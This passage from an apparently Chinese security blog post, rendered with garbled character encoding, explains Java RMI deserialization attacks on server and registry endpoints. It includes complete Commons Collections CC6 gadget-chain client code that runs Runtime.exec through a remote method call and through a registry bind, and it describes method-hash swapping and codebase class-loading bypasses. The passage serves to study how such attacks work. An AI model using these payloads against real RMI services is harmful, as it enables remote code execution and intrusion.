ç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨</strong>ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ <strong>Object ç±»å‹</strong>çš„æƒ…å†µä¸‹ï¼ŒClient ç«¯å¯ä»¥ä¼ ç»™ Server ç«¯<strong>ä»»æ„çš„ç±»</strong>ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬ä¸Šé¢å†™çš„åœ¨è¿œç¨‹è°ƒç”¨æ¥å£ RemoteInterface å­˜åœ¨ä¸€ä¸ªä¼ å…¥Objectç±»å‹çš„<code>sayGoodbye</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å¯ä»¥ä¼ ä¸€ä¸ªååºåˆ—åŒ– payload è¿›å»æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6ç›´æ¥å¼¹calcã€‚</p><p>å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯ Object ç±»å‹ï¼Œé‚£èƒ½å¦è¿›è¡Œæ”»å‡»ï¼Ÿ</p><p>å½“ç„¶å¯ä»¥ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªå°å®éªŒï¼Œæˆ‘ä»¬åœ¨Serverçš„æ¥å£å¤„è‹¥ä½¿ç”¨<code>HelloObject</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼ŒClientçš„æ¥å£ä½¿ç”¨<code>Object</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼š</p><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è‹¥æƒ³ç›´æ¥è§¦å‘ååºåˆ—åŒ–æ´ä¼šæŠ¥é”™ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>å…¶å®å¯ä»¥çœ‹å‡ºï¼Œå°±æ˜¯åœ¨æœåŠ¡ç«¯æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„è°ƒç”¨æ–¹æ³•ã€‚å¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨æ–¹æ³•åœ¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•ä¸­åœ¨ <code>this.hashToMethod_Map</code> ä¸­é€šè¿‡ Method çš„ hash æ¥æŸ¥æ‰¾ã€‚</p><p>è¿™ä¸ª hash å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŸºäºæ–¹æ³•ç­¾åçš„ SHA1 hash å€¼ã€‚</p><p>é‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œ<strong>æˆ‘ä»¬ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œåœ¨ mogwailabs çš„ [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ç½‘ç»œä»£ç†ï¼Œåœ¨æµé‡å±‚ä¿®æ”¹æ•°æ®</li><li>è‡ªå®šä¹‰ â€œjava.rmiâ€ åŒ…çš„ä»£ç ï¼Œè‡ªè¡Œå®ç°</li><li>å­—èŠ‚ç ä¿®æ”¹</li><li>ä½¿ç”¨ debugger</li></ul><p>å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p><p>å®¢æˆ·ç«¯çš„æ¥å£ä¹Ÿæ·»åŠ ä¸€ä¸ªåŒæœåŠ¡ç«¯ç›¸åŒçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å³è°ƒè¯•ä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œåœ¨<code>RemoteObjectInvocationHandler</code>è°ƒç”¨<code>invokeRemoteMethod</code>çš„æ—¶å€™ä¿®æ”¹methodï¼ˆåœ¨ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•å¤„ä¸‹æ–­ï¼Œå°† Method æ”¹ä¸ºæœåŠ¡ç«¯å­˜åœ¨çš„ HelloObject çš„ Methodï¼‰ï¼Œä¸‹é¢<code>getMethodHash(method)</code>è·å–åˆ°çš„å“ˆå¸Œå°±å’ŒæœåŠ¡ç«¯çš„ä¸€æ ·äº†ï¼Œåç»­å¼¹calcéƒ½ä¸€æ ·çš„ã€‚</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼æ’æ¡©ï¼Œåœ¨<a href="https://www.anquanke.com/post/id/200860">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><p>åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå°±å¤§å¤§çš„æ‰©å±•äº†åˆ©ç”¨é“¾ã€‚RMI çš„ååºåˆ—åŒ–é€»è¾‘ä½äº <code>sun.rmi.server.UnicastRef#unmarshalValue</code>ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†åŸºç¡€æ•°æ®ç±»å‹ï¼Œå…¶ä»–çš„ç±»å‹å‡èƒ½è°ƒç”¨ readObject è¿›è¡Œååºåˆ—åŒ–ï¼Œç”šè‡³åŸæœ¬ String ç±»å‹çš„å‚æ•°ä¹Ÿä¼šèµ° readObject ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç»“åˆä¹‹å‰çš„æ›¿æ¢æ‰‹æ®µï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼š</p><blockquote><p><strong>Server ç«¯çš„è°ƒç”¨æ–¹æ³•å­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥è¢«æ¶æ„ Client ç«¯ä¼ å…¥æ¶æ„æ•°æ®æµè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</strong></p></blockquote><h4 id="åŠ¨æ€ç±»åŠ è½½"><a href="#åŠ¨æ€ç±»åŠ è½½" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½"></a>åŠ¨æ€ç±»åŠ è½½</h4><p>ä¸Šé¢è¯´è¿‡ï¼ŒRMIååºåˆ—åŒ–å‚æ•°çš„æ—¶å€™ï¼Œè‹¥åœ¨æœ¬åœ°æ‰¾ä¸åˆ°ç±»ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseä¸‹åŠ è½½ç±»ï¼Œè€Œcodebaseå¯ä»¥ç”±å®¢æˆ·ç«¯æŒ‡å®šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ‰“ååºåˆ—åŒ–çš„åœ°æ–¹ã€‚è¿™ä¸ªç‰¹æ€§åœ¨ 6u45&#x2F;7u21 ä¹‹å‰éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè¿œç¨‹åŠ è½½ç›®æ ‡ç±»ï¼Œéœ€è¦ Server åŠ è½½å¹¶é…ç½® SecurityManagerï¼Œå¹¶è®¾ç½® <code>java.rmi.server.useCodebaseOnly=false</code>ã€‚</p><p>Server ç«¯è°ƒç”¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè°ƒç”¨ <code>unmarshalParameters</code> æ–¹æ³•ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ã€‚</p><p>ååºåˆ—åŒ–è¿‡ç¨‹ç”± RMI å°è£…ç±» MarshalInputStream æ¥å®ç°ï¼Œä¼šè°ƒç”¨ <code>resolveClass</code> æ¥è§£æ Classã€‚</p><p>æ— è®º Server ç«¯è¿˜æ˜¯ Client ç«¯ï¼Œåªè¦æœ‰ä¸€ç«¯é…ç½®äº† <code>java.rmi.server.codebase</code>ï¼Œè¿™ä¸ªå±æ€§éƒ½ä¼šè·Ÿéšæ•°æ®æµåœ¨ä¸¤ç«¯æµåŠ¨ã€‚</p><p><strong>å› æ­¤ï¼ŒClient ç«¯å¯ä»¥é€šè¿‡é…ç½®æ­¤é¡¹å±æ€§ï¼Œå¹¶å‘ Server ç«¯ä¼ é€’ä¸å­˜åœ¨çš„ç±»ï¼Œä½¿ Server ç«¯è¯•å›¾ä» <code>java.rmi.server.codebase</code> åœ°å€ä¸­è¿œç¨‹åŠ è½½æ¶æ„ç±»è€Œè§¦å‘æ”»å‡»ã€‚</strong></p><h4 id="æ›¿èº«æ”»å‡»"><a href="#æ›¿èº«æ”»å‡»" class="headerlink" title="æ›¿èº«æ”»å‡»"></a>æ›¿èº«æ”»å‡»</h4><p>åœ¨è®¨è®ºå¯¹ Server ç«¯çš„æ”»å‡»æ—¶ï¼Œè¿˜å‡ºç°äº†å¦å¤–ä¸€ç§é’ˆå¯¹å‚æ•°çš„æ”»å‡»æ€è·¯ï¼Œsu18å¸ˆå‚…ç§°å…¶ä¸ºæ›¿èº«æ”»å‡»ã€‚ä¾æ—§æ˜¯ç”¨æ¥ç»•è¿‡å½“å‚æ•°ä¸æ˜¯ Objectï¼Œæ˜¯æŒ‡å®šç±»å‹ï¼Œä½†æ˜¯è¿˜æƒ³è§¦å‘ååºåˆ—åŒ–çš„ä¸€ç§è®¨è®ºã€‚</p><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯è°ƒç”¨çš„æ–¹æ³•å‚æ•°æ˜¯ <code>HelloObject</code>ï¼Œè€Œæ”»å‡»è€…å¸Œæœ›ä½¿ç”¨ CC é“¾æ¥ååºåˆ—åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨äº†ä¸€ä¸ªå…¥å£ç‚¹ä¸º HashMap çš„ POCï¼Œé‚£ä¹ˆæ”»å‡»è€…åœ¨æœ¬åœ°çš„ç¯å¢ƒä¸­å°† HashMap é‡å†™ï¼Œè®© HashMap ç»§æ‰¿ HelloObjectï¼Œç„¶åå®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»çš„é€»è¾‘ï¼Œç”¨æ¥æ¬ºéª— RMI çš„æ ¡éªŒæœºåˆ¶ã€‚</p><p>è¿™çš„ç¡®æ˜¯ä¸€ç§æ€è·¯ï¼Œä½†æ˜¯è¿˜ä¸å¦‚ hook RMI ä»£ç ä¿®æ”¹é€»è¾‘æ¥å¾—å¿«ï¼Œæ‰€ä»¥è¿™é‡Œä¸è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="Registry-ç«¯-Attack"><a href="#Registry-ç«¯-Attack" class="headerlink" title="Registry ç«¯ Attack"></a>Registry ç«¯ Attack</h3><p>åœ¨ä½¿ç”¨ Registry æ—¶ï¼Œé¦–å…ˆç”± Server ç«¯å‘ Registry ç«¯ç»‘å®šæœåŠ¡å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ª Server ç«¯ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ï¼ŒRegistry ç«¯ä¼šååºåˆ—åŒ–è¿™ä¸ªç±»å¹¶å­˜åœ¨è‡ªå·±çš„ RegistryImpl çš„ bindings ä¸­ï¼Œä»¥ä¾›åç»­çš„æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ¶æ„çš„ Server ç«¯ï¼Œå‘ Registry ç«¯è¾“é€äº†ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶å°±å¯ä»¥è§¦å‘æ¶æ„è°ƒç”¨ã€‚</p><p>è¿™é‡Œä»ç„¶ç”¨ CC6 æµ‹è¯•ï¼Œè€Œå› ä¸º bind çš„å‚æ•°æ˜¯éœ€è¦æ˜¯ Remote ç±»å‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨äº† AnnotationInvocationHandler æ¥ä»£ç†äº† Remote æ¥å£ï¼Œå½¢æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å½¢å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è¿æ¥ Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind åˆ° Registry æ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆå§‹åŒ– Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// åˆ›å»º ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span 